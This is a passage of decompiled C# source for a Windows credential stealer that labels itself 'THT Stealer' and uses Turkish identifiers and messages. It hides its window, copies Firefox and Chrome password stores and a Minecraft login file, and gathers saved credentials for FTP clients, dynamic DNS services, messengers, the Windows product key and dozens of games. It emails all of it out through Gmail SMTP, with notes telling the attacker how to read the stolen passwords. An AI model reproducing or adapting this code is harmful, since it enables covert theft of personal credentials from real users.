      int num = (int) Interaction.MsgBox((object) this.mesaj, MsgBoxStyle.Critical, (object) this.baslik);
      MySettingsProperty.Settings.girdi = Conversions.ToString(1);
      MySettingsProperty.Settings.Save();
    }
    this.kopyala();
    this.ShowInTaskbar = false;
    this.gonder.Interval = Conversions.ToInteger(this.dk + "000");
    this.gonder.Start();
  }

  private void kopyala()
  {
    // ISSUE: unable to decompile the method.
  }

  private void Timer1_Tick(object sender, EventArgs e)
  {
    this.Hide();
  }

  private void gonder_Tick(object sender, EventArgs e)
  {
    this.iletilecekmail = new StringBuilder("");
    this.yollaa();
    MailMessage mailMessage = new MailMessage();
    string address1 = this.gmail;
    string address2 = this.gmail;
    string str1 = "Stealer Bilgileri - THT Stealer";
    string displayName = "Stealer Bilgileri - THT Stealer";
    using (WebClient webClient = new WebClient())
    {
      MailMessage message = new MailMessage(new MailAddress(address2, displayName), new MailAddress(address1));
      message.IsBodyHtml = true;
      message.Subject = str1;
      NetworkCredential networkCredential = new NetworkCredential(this.gmail, this.sifre);
      message.Body = this.iletilecekmail.ToString();
      if (this.firesec == 1)
      {
        try
        {
          string str2 = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles")[0] + "\\";
          string fileName1 = str2 + "cert8.db";
          string fileName2 = str2 + "key3.db";
          string fileName3 = str2 + "signons.sqlite";
          Attachment attachment1 = new Attachment(fileName1);
          message.Attachments.Add(attachment1);
          Attachment attachment2 = new Attachment(fileName2);
          message.Attachments.Add(attachment2);
          Attachment attachment3 = new Attachment(fileName3);
          message.Attachments.Add(attachment3);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (this.cchrome == 1)
      {
        if (MyProject.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\Login Data"))
          MyProject.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\Login Data");
        MyProject.Computer.FileSystem.CopyFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data", Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\Login Data");
        Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\Login Data");
        message.Attachments.Add(attachment);
      }
      if (this.minecraft == 1)
      {
        try
        {
          Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\lastlogin");
          message.Attachments.Add(attachment);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      new SmtpClient()
      {
        Host = "smtp.gmail.com",
        Port = Conversions.ToInteger("587"),
        EnableSsl = true,
        UseDefaultCredentials = true,
        Credentials = ((ICredentialsByHost) networkCredential)
      }.Send(message);
      message.Dispose();
      webClient.Dispose();
    }
  }

  private void mesajhazirla()
  {
    if (this.chrome == 1)
      this.iletilecekmail.AppendLine("=====Chrome=====<br />Chrome Dosyası Ekte Bulunmaktadır. Bu Dosya : Login Data Dosyasıdır. Bu Dosyayı %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default Bölümüne Atınız. Sonra Google Chrome Ayarlarından Şifreleri Görebilirsiniz. YEDEK ALMAYI UNUTMAYIN !<br /><br />");
    if (this.filezilla == 1)
      this.iletilecekmail.AppendLine("=====Filezilla=====<br />" + this.filezillat.Text + "<br /><br />");
    if (this.ftpcommander == 1)
      this.iletilecekmail.AppendLine("=====FTP Commander=====<br />" + this.scommandert.Text + "<br /><br />");
    if (this.flashfxp == 1)
      this.iletilecekmail.AppendLine("=====FlashFXP=====<br />" + this.SFlashFxpt.Text + "<br /><br />");
    if (this.coreftp == 1)
      this.iletilecekmail.AppendLine("=====CoreFTP=====<br />" + this.coreftpt.Text + "<br /><br />");
    if (this.smartftp == 1)
      this.iletilecekmail.AppendLine("=====SmartFTP=====<br />" + this.smartftpt.Text + "<br /><br />");
    if (this.noip == 1)
      this.iletilecekmail.AppendLine("=====NO-IP=====<br />" + this.noipt.Text + "<br /><br />");
    if (this.dyndns == 1)
      this.iletilecekmail.AppendLine("=====DynDNS=====<br />" + this.dyndnst.Text + "<br /><br />");
    if (this.windowskey == 1)
      this.iletilecekmail.AppendLine("=====Windows Key=====<br />" + this.windowskeyt.Text + "<br /><br />");
    if (this.valve == 1)
      this.iletilecekmail.AppendLine("=====Valve=====<br />" + this.valvet.Text + "<br /><br />");
    if (this.firefox == 1)
      this.iletilecekmail.AppendLine("=====Firefox=====<br />Firefox Dosyaları Ekte Bulunmaktadır. Bu Dosyalar : cert8.db , key3.db Ve signons.sqlite Dosyalarıdır. Bu Dosyaları %appdata%\\Mozilla\\Firefox\\Profiles Bölümündeki Bir Dosyayı Açıp İçine Atınız. Sonra Firefox Ayarlarından Şifreleri Görebilirsiniz. YEDEK ALMAYI UNUTMAYIN !<br /><br />");
    if (this.imvu == 1)
      this.iletilecekmail.AppendLine("=====IMVU=====<br />" + this.imvut.Text + "<br /><br />");
    if (this.msn == 1)
      this.iletilecekmail.AppendLine("=====MSN=====<br />" + this.msnt.Text + "<br /><br />");
    if (this.paltalk == 1)
      this.iletilecekmail.AppendLine("=====PalTalk=====<br />" + this.paltalkt.Text + "<br /><br />");
    if (this.internetexplorer == 1)
      this.iletilecekmail.AppendLine("=====Internet Explorer=====<br />" + this.internetexplorert.Text + "<br /><br />");
    if (this.opera == 1)
      this.iletilecekmail.AppendLine("=====Opera=====<br />" + this.operat.Text + "<br /><br />");
    if (this.actofwar == 1)
      this.iletilecekmail.AppendLine("=====Act Of War=====<br />" + this.actofwart.Text + "<br /><br />");
    if (this.anno1701 == 1)
      this.iletilecekmail.AppendLine("=====Anno 1071=====<br />" + this.anno1701t.Text + "<br /><br />");
    if (this.battlefield1942 == 1)
      this.iletilecekmail.AppendLine("=====Battlefield 1942=====<br />" + this.battlefield1942t.Text + "<br /><br />");
    if (this.battlefield2 == 1)
      this.iletilecekmail.AppendLine("=====Battlefield 2=====<br />" + this.battlefield2t.Text + "<br /><br />");
    if (this.battlefield2142 == 1)
      this.iletilecekmail.AppendLine("=====Battlefield 2142=====<br />" + this.battlefield2142t.Text + "<br /><br />");
    if (this.battlefieldvietnam == 1)
      this.iletilecekmail.AppendLine("=====Battlefield Vietnam=====<br />" + this.battlefieldvietnamt.Text + "<br /><br />");
    if (this.blackandwhite == 1)
      this.iletilecekmail.AppendLine("=====Black And White=====<br />" + this.blackandwhitet.Text + "<br /><br />");
    if (this.blackandwhite2 == 1)
      this.iletilecekmail.AppendLine("=====Black And White 2=====<br />" + this.blackandwhitet2t.Text + "<br /><br />");
    if (this.callofduty == 1)
      this.iletilecekmail.AppendLine("=====Call Of Duty=====<br />" + this.callofdutyt.Text + "<br /><br />");
    if (this.callofduty2 == 1)
      this.iletilecekmail.AppendLine("=====Call Of Duty 2=====<br />" + this.callofduty2t.Text + "<br /><br />");
    if (this.callofduty4 == 1)
      this.iletilecekmail.AppendLine("=====Call Of Duty 4=====<br />" + this.callofduty4t.Text + "<br /><br />");
    if (this.callofduty5 == 1)
      this.iletilecekmail.AppendLine("=====Call Of Duty 5=====<br />" + this.callofduty5t.Text + "<br /><br />");
    if (this.cacgenerals == 1)
      this.iletilecekmail.AppendLine("=====Command And Conquer: Generals=====<br />" + this.cacgeneralst.Text + "<br /><br />");
    if (this.cacgeneralszerohour == 1)
      this.iletilecekmail.AppendLine("=====Command And Conquer: Generals Zero Hour=====<br />" + this.cacgeneralzerohourt.Text + "<br /><br />");
    if (this.cactiberiansun == 1)
      this.iletilecekmail.AppendLine("=====Command And Conquer: Tiberian Sun=====<br />" + this.cactst.Text + "<br /><br />");
    if (this.cacredalert == 1)
      this.iletilecekmail.AppendLine("=====Command And Conquer: Red Alert=====<br />" + this.cacrat.Text + "<br /><br />");
    if (this.cacredalert2 == 1)
      this.iletilecekmail.AppendLine("=====Command And Conquer: Red Alert 2=====<br />" + this.cacra2t.Text + "<br /><br />");
    if (this.cacredalert2yuri == 1)
      this.iletilecekmail.AppendLine("=====Command And Conquer:Red Alert 2 Yuri's Revenge=====<br />" + this.cacra2yt.Text + "<br /><br />");
    if (this.cac3tiberiumwars == 1)
      this.iletilecekmail.AppendLine("=====Command And Conquer 3: Tiberium Wars<br />" + this.cac3twt.Text + "<br /><br />");
    if (this.companyofheroes == 1)
      this.iletilecekmail.AppendLine("=====Company Of Heroes=====<br />" + this.companyofheroest.Text + "<br /><br />");
    if (this.crysis == 1)
      this.iletilecekmail.AppendLine("=====Crysis=====<br />" + this.crysist.Text + "<br /><br />");
    if (this.techland == 1)
      this.iletilecekmail.AppendLine("=====Techland=====<br />" + this.techlandt.Text + "<br /><br />");
    if (this.farcry == 1)
      this.iletilecekmail.AppendLine("=====Far Cry=====<br />" + this.farcryt.Text + "<br /><br />");
    if (this.farcry2 == 1)
      this.iletilecekmail.AppendLine("=====Far Cry 2=====<br />" + this.farcry2t.Text + "<br /><br />");
    if (this.fear == 1)
      this.iletilecekmail.AppendLine("=====F.E.A.R.=====<br />" + this.feart.Text + "<br /><br />");
    if (this.fifa08 == 1)
      this.iletilecekmail.AppendLine("=====FIFA 08=====<br />" + this.fifat.Text + "<br /><br />");
    if (this.frontlinesfuelofwar == 1)
      this.iletilecekmail.AppendLine("=====Frontlines: Fuel Of War=====<br />" + this.frontlinest.Text + "<br /><br />");
    if (this.hellgatelondon == 1)
      this.iletilecekmail.AppendLine("=====Hellgate: London=====<br />" + this.hellgatet.Text + "<br /><br />");
    if (this.mohairborne == 1)
      this.iletilecekmail.AppendLine("=====Medal Of Honor: Airborne=====<br />" + this.mohat.Text + "<br /><br />");
    if (this.mohalliedassault == 1)
      this.iletilecekmail.AppendLine("=====Medal Of Honor: Allied Assault=====<br />" + this.mohaat.Text + "<br /><br />");
    if (this.mohaabreakth == 1)
      this.iletilecekmail.AppendLine("=====Medal Of Honor: Allied Assault Breakth=====<br />" + this.mohaabt.Text + "<br /><br />");
    if (this.mohaaspearhe == 1)
      this.iletilecekmail.AppendLine("=====Medal Of Honor: Allied Assault Spearhead=====<br />" + this.mohaast.Text + "<br /><br />");
    if (this.nba08 == 1)
      this.iletilecekmail.AppendLine("=====NBA 08=====<br />" + this.nbat.Text + "<br /><br />");
    if (this.nfsunderground == 1)
      this.iletilecekmail.AppendLine("=====Need For Speed: Underground=====<br />" + this.nfsct.Text + "<br /><br />");
    if (this.nfsunderground2 == 1)
      this.iletilecekmail.AppendLine("=====Need For Speed: Underground 2=====<br />" + this.nfsut2.Text + "<br /><br />");
    if (this.nfscarbon == 1)
      this.iletilecekmail.AppendLine("=====Need For Speed: Carbon=====<br />" + this.nfsct.Text + "<br /><br />");
    if (this.nfsmostwanted == 1)
      this.iletilecekmail.AppendLine("=====Need For Speed: Most Wanted=====<br />" + this.nfsmwt.Text + "<br /><br />");
    if (this.nfsprostreet == 1)
      this.iletilecekmail.AppendLine("=====Need For Speed: Pro Street=====<br />" + this.nfspst.Text + "<br /><br />");
    if (this.quake4 == 1)
      this.iletilecekmail.AppendLine("=====Quake 4=====<br />" + this.quaket.Text + "<br /><br />");
    if (this.stalkersoc == 1)
      this.iletilecekmail.AppendLine("=====S.T.A.L.K.E.R. Shadow of Chernobyl=====<br />" + this.stalkert.Text + "<br /><br />");
    if (this.swat4 == 1)
      this.iletilecekmail.AppendLine("=====S.W.A.T. 4=====<br />" + this.swatt.Text + "<br /><br />");
    if (this.unrealt2004 == 1)
      this.iletilecekmail.AppendLine("=====Unreal Tournament 2004=====<br />" + this.unrealt.Text + "<br /><br />");
    if (this.minecraft != 1)
      return;
    this.iletilecekmail.AppendLine("=====Minecraft=====<br />Minecraft Dosyası Ekte Bulunmaktadır. Bu Dosya : lastlogin Dosyasıdır. Bu Dosyayı %appdata%\\.minecraft Atın. Sonra İçindeki Şifreyi Minecraft Lastlogin Reader İle Öğrenebilirsiniz.");
  }

  private void yollaa()
  {
    // ISSUE: unable to decompile the method.
  }
}
